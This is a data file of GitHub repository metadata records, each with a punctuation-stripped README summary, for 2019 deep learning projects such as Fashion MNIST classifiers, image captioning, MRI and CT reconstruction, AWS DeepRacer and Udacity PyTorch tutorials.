RichaldoElias,Deep-Learning-with-Pytorch,n/a,Deep Learning with Pytorch Jupyter notebooks with solutions of some DL problems,2019-07-02T13:20:21Z,2019-10-12T13:23:25Z,Jupyter Notebook,RichaldoElias,User,0,1,1,2,master,RichaldoElias,1,0,0,0,0,0,0
leo3308,Applied-Deep-Learning,n/a,Applied Deep Learning,2019-07-03T05:50:46Z,2019-07-05T07:02:58Z,Python,leo3308,User,0,1,0,28,master,leo3308,1,0,0,1,0,1,0
Vinay352,Deep-learning-Fashion-MNIST,n/a,Deep learning Fashion MNIST Fashion MNIST is a dataset of Zalando s article imagesconsisting of a training set of 60 000 examples and a test set of 10 000 examples Each example is a 28x28 grayscale image associated with a label from 10 classes Zalando intends Fashion MNIST to serve as a direct drop in replacement for the original MNIST dataset for benchmarking machine learning algorithms It shares the same image size and structure of training and testing splits Each image is 28 pixels in height and 28 pixels in width for a total of 784 pixels in total Each pixel has a single pixel value associated with it indicating the lightness or darkness of that pixel with higher numbers meaning darker This pixel value is an integer between 0 and 255 The training and test data sets have 785 columns The first column consists of the class labels see above and represents the article of clothing The rest of the columns contain the pixel values of the associated image To locate a pixel on the image suppose that we have decomposed x as x i 28 j where i and j are integers between 0 and 27 The pixel is located on row i and column j of a 28 x 28 matrix For example pixel31 indicates the pixel that is in the fourth column from the left and the second row from the top as in the ascii diagram below Labels Each training and test example is assigned to one of the following labels 0 T shirt top 1 Trouser 2 Pullover 3 Dress 4 Coat 5 Sandal 6 Shirt 7 Sneaker 8 Bag 9 Ankle boot Each row is a separate image Column 1 is the class label Remaining columns are pixel numbers 784 total Each value is the darkness of the pixel 1 to 255 Download Dataset Go to the link below to download the dataset https www kaggle com zalando research fashionmnist Accuracy The validation accuracy 92 803 The test accuracy 92 9,2019-07-03T17:44:35Z,2019-07-04T07:23:55Z,Jupyter Notebook,Vinay352,User,0,1,0,6,master,Vinay352,1,0,0,0,0,0,0
AdolfoVillalobos,Deep_Learning_PUC,n/a,DeepLearningPUC Here i uploaded my homework and projects from IIC3697 Deep Learning course at PUC taught by professor lvaro Soto Here we worked with Keras Tensorflow and Pytorch mainly We developed CNN s for the first two homeworks working with different parameters arquitectures and loss functions depening on the task at hand we also used Triplet and Focal loss We also worked with RNN s mainly LSTMS for time serie forecast and NLP problems at the end Seq2Seq attetion models for machine translate and text summarization,2019-07-07T02:42:40Z,2019-09-29T03:24:20Z,Jupyter Notebook,AdolfoVillalobos,User,0,1,0,5,master,AdolfoVillalobos,1,0,0,0,0,0,0
Haris-Anis,Deep_Learning_Work,n/a,DeepLearningWork Starting a new phase of coding machine learning deep learning with python In this repository you can see my some practice stuffs on pandas matplotlib and numpy I ve some practice of the pandas book that is in the repository which can help you to understand the book in a much better way,2019-07-27T20:20:20Z,2019-09-09T05:23:28Z,n/a,Haris-Anis,User,1,1,0,4,master,Haris-Anis,1,0,0,0,0,0,0
singhankit16,Image_Captioning_Deep_Learning,n/a,ImageCaptioningDeepLearning COCO Dataset Abstract Image Captioning refers to the process of generating textual description from an image based on the objects and actions in the image Image captioning is interesting to us because the problem setting requires both an understanding of what features or pixel context represent which objects and the creation of a semantic construction grounded to those objects The task of image captioning is divided into two modules Image based modules and language based module For Image based module we rely on Convolutional Neural Network model and for the languages based module we rely on a Recurrent Neural Network Introduction Automatically generating textual description from an artificial system is the task of image captioning When given an image the model describes in English what is in the image To achieve this our model is comprised of an encoder which is a CNN and a decoder which is an RNN The CNN encoder is given images for a classification task and its output is fed into the RNN decoder which outputs English sentences Usually a pretrained CNN extracts the features from our input image The feature vector is linearly transformed to have the same dimension as the input dimension of the RNN LSTM network This network is trained as a language model on our feature vector For training our LSTM model we predefine our label and target text image https github com singhankit16 ImageCaptioningDeepLearning blob master Image PNG Dataset We use the Microsoft Common Objects in Context MS COCO dataset for this project It is a large scale dataset for scene understanding The dataset is commonly used to train and benchmark object detection segmentation and captioning algorithms COCO enables data intensive deep neural networks to learn the mapping from images to sentences given a comparatively large dataset of images with multiple human label descriptions of said images Results Results https github com singhankit16 ImageCaptioningDeepLearning blob master Results PNG,2019-07-10T03:34:25Z,2019-08-22T06:50:34Z,Jupyter Notebook,singhankit16,User,0,1,0,7,master,singhankit16,1,0,0,0,0,0,0
nebula-beta,Deep-Learning-Knowledge,n/a,MathJax Plugin for Github https github com orsharir github mathjax TeX All the Things https github com emichael texthings,2019-07-13T15:05:21Z,2019-10-03T11:58:14Z,HTML,nebula-beta,User,0,1,0,21,master,nebula-beta#alphaway,2,0,0,0,0,0,0
hanyoseob,k-space-deep-learning,n/a,Paper k Space Deep Learning for Accelerated MRI Accepted by IEEE Transactions on Medical Imaging https arxiv org abs 1805 03779 Implementation MatConvNet matconvnet 1 0 beta24 Please run the matconvnet 1 0 beta24 matlab vlcompilenn m file to compile matconvnet There is instruction on http www vlfeat org matconvnet mfiles vlcompilenn k Space Deep Learning matconvnet 1 0 beta24 examples k space deep learning Please run the matconvnet 1 0 beta24 examples k space deep learning install m Install the customized library Download the trained networks such as image domain learning and k space deep learning Trained network Trained network for image domain learing for 1 coil and 8 coils on Cartesian trajectory is uploaded Trained network for k space deep learning for 1 coil and 8 coils on Cartesian trajectory is uploaded Test data Iillustate the Fig 6 7 and 9 for k Space Deep Learning fro Accelerated MRI MR images from http mridata org are uploaded to train and test,2019-07-12T19:40:50Z,2019-07-26T10:26:15Z,MATLAB,hanyoseob,User,0,1,0,5,master,hanyoseob,1,0,0,1,0,0,0
wyd1582,deep_learning_comparative_study,n/a,deeplearningcomparitivestudy repo for preparing best materials for deep learning study references deeplearning ai Andrew Ng deep learning Goodfellow,2019-06-25T01:28:03Z,2019-07-10T11:39:36Z,Jupyter Notebook,wyd1582,User,0,1,0,13,master,wyd1582,1,0,0,0,0,0,0
leovantoji,Deep-Learning-Nanodegree,n/a,Udacity Deep Learning Nanodegree Certificate Overview Official Duration Projects Apr Oct 2019 Predicting Bike Sharing PatternsDog Breed ClassifierGenerate TV ScriptsGenerate FacesDeploy a Model AWS Course Contents Neural Networks Convolutional Neural Networks Recurrent Neural Networks LSTM Generative Adversarial Networks Deploy a Model Cloud Technology,2019-07-18T07:01:28Z,2019-11-06T03:55:24Z,n/a,leovantoji,User,0,1,0,47,master,leovantoji,1,0,0,0,0,0,0
OsmoSystems,cosmobot-deep-learning,n/a,cosmobot deep learning Cosmobot deep learning models and helper code Iterating on models When to branch This repo will contain one directory for each major type of model with the best version of each checked into master If you are making tweaks to a model do so in a branch If the tweaks turn out to be an improvement on that model land them If you are creating an new type of model rather than iterating on an existing model create a new directory for it Documenting changes Create a directory in the Experiments directory on Google Drive with a README detailing your changes and results Reference your branch name or changeset in the README Iterating with Jupyter notebooks TODO https app asana com 0 819671808102776 1130875537031890 f Datasets The dataset csvs are generated independently and copied into this repo For more context and a changelog see ML Dataset README https docs google com document d 1izgRFPtPTrP61cXMleMgrbL8aZ8zbC19zs2ssv6duZM edit heading h n3b0owytqckh Terminology Some standard terminology around our raw image data and how we process it COPY PASTA These definitions have been copied from the cosmobot process experiment repo RAW image file A JPEG RAW image file as directly captured by a PiCam v2 saved as a JPEG RGB image A 3D numpy ndarray a 2D array of pixels row major where each pixel is a 1D array of red green blue channels with a value between 0 and 1 This is our default format for interacting with images An example 4 pixel 2x2 image would have this shape r1 g1 b1 r2 g2 b2 r3 g3 b3 r4 g4 b4 ROI An RGB image that has been cropped to a specific Region of Interest ROI ROI definition A 4 tuple in the format provided by cv2 selectROI startcol startrow cols rows used to define a Region of Interest ROI,2019-07-22T18:17:52Z,2019-12-06T20:21:24Z,Python,OsmoSystems,Organization,4,1,0,233,master,jaimemarijke#EvanSimpson#rush340#thatneat,4,0,0,0,0,0,75
liaolushen,LDRFGVD,n/a,LDRFGVD A python realization of the paper Learning Deep Representations of Fine Grained Visual Descriptions https arxiv org pdf 1605 05395 pdf,2019-07-09T05:20:50Z,2019-12-11T09:08:15Z,Python,liaolushen,User,0,1,2,13,master,liaolushen#Zeyu1994,2,0,0,0,0,0,0
sanidhyamangal,coursera_dl,n/a,,2019-07-12T20:07:22Z,2019-08-16T07:44:38Z,Jupyter Notebook,sanidhyamangal,User,0,1,2,6,master,sanidhyamangal,1,0,0,0,0,0,0
alvaroferran,SeparAItor,ai#autonomous#keras#recycling#robot#tensorflow,recycle,2019-06-28T13:37:14Z,2019-09-02T23:05:51Z,Python,alvaroferran,User,0,1,2,21,master,alvaroferran,1,0,0,0,0,0,0
ZhaohengLi,reinforcement-learning,n/a,reinforcement learning 2019 Deep Learning Summer School Tsinghua University This code mainly focus on Value Iteration Q Learning and Epsilon Greedy,2019-07-20T05:55:51Z,2019-07-21T15:30:31Z,Python,ZhaohengLi,User,0,1,0,6,master,ZhaohengLi,1,0,0,0,0,0,0
henriwoodcock,Stock-Price-Prediction,classification#deep-learning#finance#machine-learning#regression#stock-price-prediction,Machine and Deep Learning for Stock Price Prediction Comparison of Classification and Regression Techniques The objective of this report is to compare the use of classification models and regression models from Machine and Deep Learning are used to predict the price trend of a stock In this report the stock that is used is the Koninklijke KPN N V KPN stock from the Amsterdam Exchange AEX Index Technical features and the price of 4 other stocks from the AEX Index are used to train 12 models The 12 models are 6 regression and 6 classification models these are Support Vector Machines Regression Feedfor ward Neural Networks Recurrent Neural Networks and auto encoded variants of those models Each model trained to tackle the classification problem and the regression problem It is found on average that classification models are able to predict price movements better however this comes at the cost of only achieving higher results when the models are trained on more data regression models actually outperformed classification models when less training data is used However it is also found that re gression models can accurately predict the actual price with an average mean absolute error as low as 0 0867 which could be of more value than trend prediction to certain investors Specific models are then compared Overall it is concluded that classification models work best in predicting trend with the best trend prediction model being a Recurrent Neural Network which predicted the correct trend 55 46 Table of Contents Literature Review Experiment and Results Report report pdf Code Classification Models SVM SVM py MLP MLP 20 20Classification py RNN RNN 20 20Classification py Auto Encoded SVM Auto Encoded 20 20SVM py Auto Encoded MLP Auto Encoded 20MLP 20 20Classification py Auto Encoded RNN Auto Encoded 20RNN 20 20Classification py Regression Models SVM SVR py MLP MLP 20 20Regression py RNN RNN 20 20Regression py Auto Encoded SVR Auto Encoded 20 20SVR py Auto Encoded MLP Auto Encoded 20MLP 20 20Regression py Auto Encoded RNN Auto Encoded 20RNN 20 20Regression py This report formed part of my 3rd research project at the University of Leeds,2019-08-05T21:31:03Z,2019-09-01T19:47:37Z,Python,henriwoodcock,User,1,1,2,33,master,henriwoodcock,1,0,0,2,0,0,0
hulush,Machine-Learning,n/a,Machine Learning AI and Deep learning research Self driving car Object detection methods,2019-07-30T00:49:04Z,2019-08-05T00:36:09Z,Python,hulush,User,1,1,1,4,master,batgerelwego#hulush,2,0,0,0,0,0,0
jongcye,deeplearningLDCT,n/a,Paper A deep convolutional neural network using directional wavelets for low dose X ray CT reconstruction published in Medical Physics 2017 http onlinelibrary wiley com doi 10 1002 mp 12344 full 2nd winner of 2016 Low Dose CT Grand Challenge Wavelet Domain Residual Network WavResNet for Low Dose X ray CT Reconstruction Accepted at Fully3D 2017 https arxiv org abs 1703 01383 Deep Convolutional Framelet Denoising for Low Dose CT via Wavelet Residual Network published in IEEE Transactions on Medical Imaging 2018 https ieeexplore ieee org abstract document 8332971 Implementation MatConvNet matconvnet 1 0 beta24 Please run the matconvnet matlab vlcompilenn m file to compile matconvnet There is instruction on http www vlfeat org matconvnet mfiles vlcompilenn Learned network Learned network for 2016 Low Dose CT Grand Challenge is uploaded Learned network for WavResNet is uploaded Learned network for Deep Convolutional Framelet Denoising is uploaded Test data 3 CT images from 2016 Low Dose CT Grand Challenge are uploaded to test Thanks Dr Cynthia McCollough the Mayo Clinic the American Association of Physicists in Medicine AAPM and grand EB017095 and EB017185 from the National Institute of Biomedical Imaging and Bioengineering for providing the Low Dose CT Grand Challenge dataset,2019-07-18T02:20:39Z,2019-11-04T10:18:34Z,MATLAB,jongcye,User,0,1,1,27,master,eunh,1,0,0,0,0,0,0
Jonathan-Andrews,DLMB-Deep-Learning-Model-Builder,n/a,DLMB Deep Learning Model Builder DLMB is a deep learning library that allows you to quickly and easily create machine learning models without requiring much knowledge on machine learning DLMB Logo https i imgur com 1N0MCIC png Please have a look at this repo s wiki to learn more about this deep learning library,2019-07-07T11:50:22Z,2019-11-23T13:32:21Z,Python,Jonathan-Andrews,User,0,1,0,21,master,Jonathan-Andrews,1,0,0,0,0,0,0
dipampatel18,AWS-DeepRacer,n/a,AWS DeepRacer Trained an AWS DeepRacer Robot Car using Reinforcement Learning in AWS SageMaker and RoboMaker AWS DeepRacer is a 1 18th scale race car which gives you an interesting and fun way to get started with reinforcement learning RL RL is an advanced machine learning ML technique which takes a very different approach to training models than other machine learning methods Its super power is that it learns very complex behaviors without requiring any labeled training data and can make short term decisions while optimizing for a longer term goal With AWS DeepRacer you now have a way to get hands on with RL experiment and learn through autonomous driving You can get started with the virtual car and tracks in the cloud based 3D racing simulator and for a real world experience you can deploy your trained models onto AWS DeepRacer and race your friends or take part in the global AWS DeepRacer League Developers the race is on AWS DeepRacer As an Integrated Learning System Reinforcement learning especially deep reinforcement learning has proven effective in solving a wide array of autonomous decision making problems It has applications in financial trading data center cooling fleet logistics and autonomous racing to name a few To help reduce the learning curve AWS DeepRacer simplifies the process in three ways By offering a wizard to guide training and evaluating reinforcement learning models The wizard includes pre defined environments states actions and customizable reward functions By providing a simulator to emulate interactions between a virtual agent and a virtual environment By offering an AWS DeepRacer vehicle as a physical agent Use the vehicle to evaluate a trained model in a physical environment This closely resembles a real world use case The AWS DeepRacer Console The AWS DeepRacer console is a graphical user interface to interact with the AWS DeepRacer service You can use the console to train a reinforcement learning model and to evaluate the model performance in the AWS DeepRacer simulator built upon AWS RoboMaker In the console you can also download a trained model for deployment to your AWS DeepRacer vehicle for autonomous driving in a physical environment In summary the AWS DeepRacer console supports the following features Create a training job to train a reinforcement learning model with a specified reward function optimization algorithm environment and hyperparameters Choose a simulated track to train and evaluate a model by using Amazon SageMaker and AWS RoboMaker Clone a trained model to improve training by tuning hyperparameters to optimize your model s performance Download a trained model for deployment to your AWS DeepRacer vehicle so it can drive in a physical environment Submit your model to a virtual race and have its performance ranked against other models in a virtual leaderboard My Approach When I initially trained for a few times I did a two mistakes Was trying to control too many parameters of the agent and which ultimately messed up with its learning Created multiple parameter conditions instead of having them all under just one few conditions As a result the overall reward for the episode did increase but it failed to learn the optimal policy I implemented the changes on the final model fastest car alive It was trained for 5 hours with the following training configurations and a slight modification of the hyperparameters from their default values Reduced the parameters under consideration and focused on having an optimal policy to achieve the target of staying within the track and completing the entire track Staying within the track was the first condition to be achieved which was rewarded based on the percent of track completed and its current speed Thereafter driving on the center lane with minimal deviation was the next goal for the reward function Avoiding unnecessary steering was the final goal Following was the action space for the agent During training the episodic rewards were more or less the same as my previous trials however the percentage of track completion did slightly increase which indicated that the agent was learning the optimal policy In the evaluation phase out of 5 trial runs the agent could complete the entire track twice in 23 04 and 22 04 seconds respectively My next goal is to reduce this time by half by mitigating the zig zag behavior and increasing the speed of the agent References AWS DeepRacer Homepage https aws amazon com deepracer What is DeepRacer https docs aws amazon com deepracer latest developerguide what is deepracer html Getting Started with AWS DeepRacer https aws amazon com deepracer getting started AWS DeepRacer Getting Started Guide https d1 awsstatic com deepracer AWS DeepRacer Getting Started Guide pdf Online Course on AWS DeepRacer Driven by Reinforcement Learning https www aws training learningobject wbc id 32143 AWS DeepRacer Workshops https github com aws samples aws deepracer workshops,2019-07-24T19:50:07Z,2019-08-15T08:41:33Z,Python,dipampatel18,User,1,1,1,27,master,dipampatel18,1,0,0,0,0,0,0
HarilalOP,DeeplearningTimeseriesForecasting,n/a,DeeplearningTimeseriesForecasting Different deep learning architectures for time series forecasting Contents Libraries Data Data overview Data Manipulation Exploratory Data Analysis Data preprocessing Model Building MLP CNN Vanilla LSTM Stacked LSTM Bidirectional LSTM CNN LSTM Conv LSTM Model Performances Model performance metrics Compare model metrics,2019-08-02T09:07:05Z,2019-08-02T09:16:59Z,Jupyter Notebook,HarilalOP,User,1,1,0,5,master,HarilalOP#harilalpolimi,2,0,0,0,0,0,0
Adam-ZhongshuZheng,DeepTrainFrame,n/a,DeepTrainFrame A easy deep learning train frame for unix shell files model py The network model to be trained dataloader py The dataset loader for the framework train py The main training code of the framework including the data preparing the model preparing and the train test utils py Some useful little tools for the framework rutraining sh The shell file for Unix system to run all the train text code Some training parameters can be changed here,2019-07-02T02:39:51Z,2019-10-26T16:09:31Z,Python,Adam-ZhongshuZheng,User,0,1,0,9,master,Adam-ZhongshuZheng,1,0,0,0,0,0,0
iomgaa,Learning-Deeplearning-for-100-days,n/a,Learning Deeplearning for 100 days 100 40,2019-06-26T04:13:41Z,2019-07-09T14:27:18Z,Jupyter Notebook,iomgaa,User,0,1,0,8,master,iomgaa,1,0,0,0,0,0,1
ThesisCoacher,AppliedDeepLearningGroupWork,n/a,AppliedDeepLearningGroupWork This GitHub Repository was created in the course Applied Deep Learning at the University of St Gallen You can find all information which is necessary to understand this Repository in the Learning Reflection folder,2019-07-02T14:46:58Z,2019-07-24T07:15:35Z,Jupyter Notebook,ThesisCoacher,User,0,1,1,37,master,ThesisCoacher#McCahen,2,0,0,0,0,0,0
antopraju,Deep-Learning-Specialization-Stanford-Coursera,n/a,Deep Learning Specialization Stanford Coursera Convolutional networks RNNs LSTM Adam Dropout BatchNorm Xavier He initialization Case Studies on healthcare autonomous driving sign language reading music generation and natural language processing Deep Learning Framework Used Tensorflow,2019-06-25T04:14:45Z,2019-08-11T22:54:26Z,Jupyter Notebook,antopraju,User,0,1,0,7,master,antopraju,1,0,0,0,0,0,0
SooDevv,deep-learning-from-scratch2,n/a,deep learning from scratch2,2019-06-24T00:27:40Z,2019-07-23T11:32:08Z,Jupyter Notebook,SooDevv,User,0,1,0,3,master,SooDevv,1,0,0,0,0,0,0
alphoenixbiz,Deep-Learning-Tensorflow-PyTorch,n/a,Deep Learning Tensorflow PyTorch Deep learning with Tensorflow and PyTorch creating examples on small datasets,2019-07-05T12:40:53Z,2019-09-16T14:35:22Z,Jupyter Notebook,alphoenixbiz,User,0,1,0,84,master,alphoenixbiz,1,0,0,0,0,0,0
jfnaro,Deep-Learning-With-Python-Examples,n/a,Deep Learning With Python Examples Practice programs for machine learning with Keras All of the files in this repository are based on examples in Francois Chollet s book Deep Learning with Python The HTML files are the easiest to read but the jupyter notebooks contain all of the code and comments Please note that values may be slightly different if you run the code,2019-07-06T21:49:50Z,2019-07-19T04:29:06Z,HTML,jfnaro,User,0,1,0,17,master,jfnaro,1,0,0,0,0,0,0
EliShayGH,deep-learning-v2-pytorch,n/a,Deep Learning PyTorch This repository contains material related to Udacity s Deep Learning Nanodegree program https www udacity com course deep learning nanodegree nd101 It consists of a bunch of tutorial notebooks for various deep learning topics In most cases the notebooks lead you through implementing models such as convolutional networks recurrent networks and GANs There are other topics covered such as weight initialization and batch normalization There are also notebooks used as projects for the Nanodegree program In the program itself the projects are reviewed by real people Udacity reviewers but the starting code is available here as well Table Of Contents Tutorials Introduction to Neural Networks Introduction to Neural Networks https github com udacity deep learning v2 pytorch tree master intro neural networks Learn how to implement gradient descent and apply it to predicting patterns in student admissions data Sentiment Analysis with NumPy https github com udacity deep learning v2 pytorch tree master sentiment analysis network Andrew Trask http iamtrask github io leads you through building a sentiment analysis model predicting if some text is positive or negative Introduction to PyTorch https github com udacity deep learning v2 pytorch tree master intro to pytorch Learn how to build neural networks in PyTorch and use pre trained networks for state of the art image classifiers Convolutional Neural Networks Convolutional Neural Networks https github com udacity deep learning v2 pytorch tree master convolutional neural networks Visualize the output of layers that make up a CNN Learn how to define and train a CNN for classifying MNIST data https en wikipedia org wiki MNISTdatabase a handwritten digit database that is notorious in the fields of machine and deep learning Also define and train a CNN for classifying images in the CIFAR10 dataset https www cs toronto edu kriz cifar html Transfer Learning https github com udacity deep learning v2 pytorch tree master transfer learning In practice most people don t train their own networks on huge datasets they use pre trained networks such as VGGnet Here you ll use VGGnet to help classify images of flowers without training an end to end network from scratch Weight Initialization https github com udacity deep learning v2 pytorch tree master weight initialization Explore how initializing network weights affects performance Autoencoders https github com udacity deep learning v2 pytorch tree master autoencoder Build models for image compression and de noising using feedforward and convolutional networks in PyTorch Style Transfer https github com udacity deep learning v2 pytorch tree master style transfer Extract style and content features from images using a pre trained network Implement style transfer according to the paper Image Style Transfer Using Convolutional Neural Networks https www cv foundation org openaccess contentcvpr2016 papers GatysImageStyleTransferCVPR2016paper pdf by Gatys et al Define appropriate losses for iteratively creating a target style transferred image of your own design Recurrent Neural Networks Intro to Recurrent Networks Time series Character level RNN https github com udacity deep learning v2 pytorch tree master recurrent neural networks Recurrent neural networks are able to use information about the sequence of data such as the sequence of characters in text learn how to implement these in PyTorch for a variety of tasks Embeddings Word2Vec https github com udacity deep learning v2 pytorch tree master word2vec embeddings Implement the Word2Vec model to find semantic representations of words for use in natural language processing Sentiment Analysis RNN https github com udacity deep learning v2 pytorch tree master sentiment rnn Implement a recurrent neural network that can predict if the text of a moview review is positive or negative Attention https github com udacity deep learning v2 pytorch tree master attention Implement attention and apply it to annotation vectors Generative Adversarial Networks Generative Adversarial Network on MNIST https github com udacity deep learning v2 pytorch tree master gan mnist Train a simple generative adversarial network on the MNIST dataset Batch Normalization https github com udacity deep learning v2 pytorch tree master batch norm Learn how to improve training rates and network stability with batch normalizations Deep Convolutional GAN DCGAN https github com udacity deep learning v2 pytorch tree master dcgan svhn Implement a DCGAN to generate new images based on the Street View House Numbers SVHN dataset CycleGAN https github com udacity deep learning v2 pytorch tree master cycle gan Implement a CycleGAN that is designed to learn from unpaired and unlabeled data use trained generators to transform images from summer to winter and vice versa Deploying a Model with AWS SageMaker All exercise and project notebooks https github com udacity sagemaker deployment for the lessons on model deployment can be found in the linked Github repo Learn to deploy pre trained models using AWS SageMaker Projects Predicting Bike Sharing Patterns https github com udacity deep learning v2 pytorch tree master project bikesharing Implement a neural network in NumPy to predict bike rentals Dog Breed Classifier https github com udacity deep learning v2 pytorch tree master project dog classification Build a convolutional neural network with PyTorch to classify any image even an image of a face as a specific dog breed TV Script Generation https github com udacity deep learning v2 pytorch tree master project tv script generation Train a recurrent neural network to generate scripts in the style of dialogue from Seinfeld Face Generation https github com udacity deep learning v2 pytorch tree master project face generation Use a DCGAN on the CelebA dataset to generate images of new and realistic human faces Elective Material Intro to TensorFlow https github com udacity deep learning v2 pytorch tree master tensorflow intro to tensorflow Starting building neural networks with TensorFlow Keras https github com udacity deep learning v2 pytorch tree master keras Learn to build neural networks and convolutional neural networks with Keras Dependencies Configure and Manage Your Environment with Anaconda Per the Anaconda docs http conda pydata org docs Conda is an open source package management system and environment management system for installing multiple versions of software packages and their dependencies and switching easily between them It works on Linux OS X and Windows and was created for Python programs but can package and distribute any software Overview Using Anaconda consists of the following 1 Install miniconda http conda pydata org miniconda html on your computer by selecting the latest Python version for your operating system If you already have conda or miniconda installed you should be able to skip this step and move on to step 2 2 Create and activate a new conda environment http conda pydata org docs using envs html Each time you wish to work on any exercises activate your conda environment 1 Installation Download the latest version of miniconda that matches your system Linux Mac Windows 64 bit 64 bit bash installer lin64 64 bit bash installer mac64 64 bit exe installer win64 32 bit 32 bit bash installer lin32 32 bit exe installer win32 win64 https repo continuum io miniconda Miniconda3 latest Windows x8664 exe win32 https repo continuum io miniconda Miniconda3 latest Windows x86 exe mac64 https repo continuum io miniconda Miniconda3 latest MacOSX x8664 sh lin64 https repo continuum io miniconda Miniconda3 latest Linux x8664 sh lin32 https repo continuum io miniconda Miniconda3 latest Linux x86 sh Install miniconda http conda pydata org miniconda html on your machine Detailed instructions Linux http conda pydata org docs install quick html linux miniconda install Mac http conda pydata org docs install quick html os x miniconda install Windows http conda pydata org docs install quick html windows miniconda install 2 Create and Activate the Environment For Windows users these following commands need to be executed from the Anaconda prompt as opposed to a Windows terminal window For Mac a normal terminal window will work Git and version control These instructions also assume you have git installed for working with Github from a terminal window but if you do not you can download that first with the command conda install git If you d like to learn more about version control and using git from the command line take a look at our free course Version Control with Git https www udacity com course version control with git ud123 Now we re ready to create our local environment 1 Clone the repository and navigate to the downloaded folder This may take a minute or two to clone due to the included image data git clone https github com udacity deep learning v2 pytorch git cd deep learning v2 pytorch 2 Create and activate a new environment named deep learning with Python 3 6 If prompted to proceed with the install Proceed y n type y Linux or Mac conda create n deep learning python 3 6 source activate deep learning Windows conda create name deep learning python 3 6 activate deep learning At this point your command line should look something like deep learning deep learning v2 pytorch The deep learning indicates that your environment has been activated and you can proceed with further package installations 3 Install PyTorch and torchvision this should install the latest version of PyTorch Linux or Mac conda install pytorch torchvision c pytorch Windows conda install pytorch c pytorch pip install torchvision 6 Install a few required pip packages which are specified in the requirements text file including OpenCV pip install r requirements txt 7 That s it Now most of the deep learning libraries are available to you Very occasionally you will see a repository with an addition requirements file which exists should you want to use TensorFlow and Keras for example In this case you re encouraged to install another library to your existing environment or create a new environment for a specific project Now assuming your deep learning environment is still activated you can navigate to the main repo and start looking at the notebooks cd cd deep learning v2 pytorch jupyter notebook To exit the environment when you have completed your work session simply close the terminal window,2019-06-24T17:35:04Z,2019-07-29T12:03:35Z,Jupyter Notebook,EliShayGH,User,0,1,0,215,master,cezannec#jchernus#mcleonard#EliShayGH#rrrrrr8#NadimKawwa#cvanderw#jaintj95#marielen#Fernandohf#dJani97#kastentx#jcardonnet#fixingitnow#soswow#AllanHasegawa#ashwindasr#esteveste#Better-Boy#skysign#GabrielePicco#harshitjindal#janmande#josemontiel#chandru11235#mvirgo#nikunj-taneja#cTxplorer#stoufa#thomasxmeng#asvcode#toppare#sohe1l,33,0,0,1,0,1,1
cedarbye,deep-learning-models-with-keras,n/a,deep learning models with keras,2019-07-18T08:53:15Z,2019-07-26T07:31:27Z,Python,cedarbye,User,0,1,0,2,master,cedarbye,1,0,0,0,0,0,0
mnitin3,Bitcoin-Prediction-using-Deep-Learning,n/a,Bitcoin Prediction using Deep Learning Prediction of Bitcoin prices using deep learning on sentiments from Twitter data,2019-07-24T06:54:28Z,2019-11-05T05:31:35Z,Jupyter Notebook,mnitin3,User,0,1,0,6,master,mnitin3,1,0,0,0,0,0,0
AngryCJ,Notes---Deep-Learning-With-Python,n/a,Notes Deep Learning With Python URL 2019 08 01 todo todo,2019-08-01T07:33:15Z,2019-08-01T07:48:59Z,n/a,AngryCJ,User,1,1,0,2,master,AngryCJ,1,0,0,0,0,0,0
y2sman,deep-learning-with-python-notebooks,n/a,deep learning with python notebooks,2019-07-29T01:45:49Z,2019-08-12T15:39:13Z,Jupyter Notebook,y2sman,User,1,1,0,1,master,y2sman,1,0,0,0,0,0,0
VishalS99,Document-Deskewing-using-Deep-learning,convolutional-networks#document-deskew#edge-detection#image-segmentation#opencv-python#python3,DOCUMENT EDGE DETECTION USING U Net ARCHITECTURE IN KERAS The architecture was inspired by U Net Convolutional Networks for Biomedical Image Segmentation http lmb informatik uni freiburg de people ronneber u net Overview A small application built on top of U Net segmentation architecture that segments documents from images and performs perspective transform on it Running the document through the model yields a mask of the document The mask is the preprocessed to further isolate the document from the background The Canny edge detector is used to detect the edges of the document in the mask and then the optimum contour is identified Perspective transform is used on the original image with the 4 corner points obtained from the contours This is an improvement over the previous model where direct canny is applied without image segmentation It had very poor accuracy in terms of detecting the edges of the document Pre processing The images are 3 D volume tiff you should transfer the stacks into images first The data for training contains 30 256 256 images Create the following directory structure data npydata train image label test results static FinalTransformedDoc templates uploads Model This deep neural network is implemented with Keras functional API which makes it extremely easy to experiment with different interesting architectures The output from the network is a 256 256 which represents a mask that should be learned Sigmoid activation function makes sure that mask pixels are in 0 1 range Training The model is trained for 10 epochs After 10 epochs the calculated accuracy is about 0 91 The loss function for the training is basically just a binary cross entropy How to use Dependencies This tutorial depends on the following libraries Tensorflow Keras 1 0 libtiff optional OpenCv Numpy OS Also this code should be compatible with Python versions 2 7 3 6 Prepare the data First transfer 3D volume tiff to 30 256 256 images To do so run python compress py providing the right input and output directory The labels have to black n white masks 256 256 named serially from 0 Define the model Check out getunet in unet py to modify the model optimizer and loss function Train the model and generate masks for test images Run python train py to train the model After this script finishes in imgsmasktest npy masks for corresponding images in imgstest npy should be generated I suggest you examine these masks for getting further insight into your model s performance Generating masks of documents from the trained model Run python test py to get the masks of the images After it s done the resultant masks are saved in results Generating the final document Run python document edge detect py The final document is saved in FinalTransformedDoc If both mask generation and edge detection should happen together uncomment the first 3 comments under the main function Show your support Give a if this project helped you,2019-07-10T12:37:01Z,2019-11-14T17:30:57Z,Python,VishalS99,User,0,1,0,10,master,VishalS99,1,0,0,0,0,0,0
HanSeokhyeon,Deep_Learning_with_PyTorch,n/a,Deep Learning with PyTorch This project is learning the neural networks for XOR and MNIST using PyTorch XOR networks architecture DNN 2 4 2 loss 9 9854952e 01 1 4504353e 03 7 7366392e 04 9 9922633e 01 6 2815300e 03 9 9371850e 01 9 9889624e 01 1 1037140e 03 predicted 0 1 1 0 MNIST networks architecture DNN 784 800 10 1 loss 1 692 2 loss 1 556 3 loss 1 538 4 loss 1 527 5 loss 1 519 6 loss 1 513 7 loss 1 508 8 loss 1 504 9 loss 1 500 10 loss 1 497 Finished Training Accuracy 0 9653,2019-07-21T10:43:00Z,2019-09-27T10:04:38Z,Python,HanSeokhyeon,User,0,1,0,5,master,HanSeokhyeon,1,0,0,0,0,0,0
Saadt83,Malaria_Detection_From_Deep_Learning,n/a,MalariaDetectionFromDeepLearning Dataset https www kaggle com iarunava cell images for detecting malaria,2019-06-26T10:25:15Z,2019-07-22T07:44:12Z,Jupyter Notebook,Saadt83,User,0,1,0,2,master,Saadt83,1,0,0,0,0,0,0
